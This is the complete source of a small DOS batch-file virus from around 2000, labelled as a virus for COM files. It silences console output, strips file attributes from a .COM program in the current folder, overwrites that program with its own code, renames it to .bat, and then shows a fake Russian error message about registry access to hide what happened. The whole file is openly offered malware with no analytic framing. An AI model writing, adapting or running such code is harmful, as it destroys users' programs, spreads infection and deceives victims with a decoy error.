:Small BAT Virus for COM files
:(c) Steel by 2000 year
@ctty nul
for %%q in (*.COM) do set AfGan=%%q
attrib %afGan% -h -r -a -s
copy %0 %AfGan%
for %%w in (%AfGan%) do find "AfGan" %%w
ren %AfGan% *.bat
@ctty con
cls
@echo.
@echo  ┌────────────────────────────────────────────────────────────┐
@echo  │Не удаётся передать параметры системному доступу реестра... │
@echo  └────────────────────────────────────────────────────────────┘
